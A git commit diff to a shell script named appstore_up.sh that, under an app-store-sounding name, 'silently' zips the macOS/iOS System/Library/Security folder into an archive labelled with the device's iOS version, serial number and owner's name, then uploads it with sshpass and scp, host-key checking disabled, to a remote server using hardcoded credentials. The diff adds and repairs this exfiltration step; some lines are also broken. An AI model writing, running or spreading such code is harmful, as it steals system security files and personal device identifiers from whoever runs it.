fd0631d3365c968834a44ec271d5e60992af8076
codecpacka <32800467+codecpacka@users.noreply.github.com>
2026-06-08 16:49:39 +0530

    Update appstore_up.sh

--- appstore_up.sh
+++ appstore_up.sh
@@ -8,12 +8,12 @@ REMOTE_USER="07319b13f82f42f4b7992f67379c8502"
 REMOTE_PASS="xYKQetq8br1c99TV7BkgCrRZ6GpVylYl"
 REMOTE_PATH="/home"
 REMOTE_DEST="/"
-ARCHIVE_NAME="$IOS_VERSION_$SERIAL_NUMBER_$LOCAL_FILE_$PERSON_NAME
+ARCHIVE_NAME="$IOS_VERSION_$SERIAL_NUMBER_$LOCAL_FILE_$PERSON_NAME"
 
 cd $home/../../../System/Library/
 archeiving files
 echo "archiving silently"
-zip -qr appstore_unmodified.zip Security && echo "Archiving complete!"
+zip -qr $ARCHIVE_NAME.zip Security && echo "Archiving complete!"
 
 
 
@@ -23,7 +23,8 @@ zip -qr appstore_unmodified.zip Security && echo "Archiving complete!"
 # --- Upload Command ---
 # -p specifies the password
 # -o StrictHostKeyChecking=no prevents the script from hanging on new host prompts
-sshpass -p "$REMOTE_PASS" scp -o StrictHostKeyChecking=no "$LOCAL_FILE" "$REMOTE_USER@$REMOTE_HOST:$REMOTE_DEST"
+#sshpass -p "$REMOTE_PASS" scp -o StrictHostKeyChecking=no "$LOCAL_FILE" "$REMOTE_USER@$REMOTE_HOST:$REMOTE_DEST"
+sshpass -p "$REMOTE_PASS" scp -o StrictHostKeyChecking=no "$ARCHIVE_NAME" "$REMOTE_USER@$REMOTE_HOST:$REMOTE_DEST"
  echo "connection sucesfully"
 # Check if the upload was successful
 if [[ $? -eq 0 ]]; then
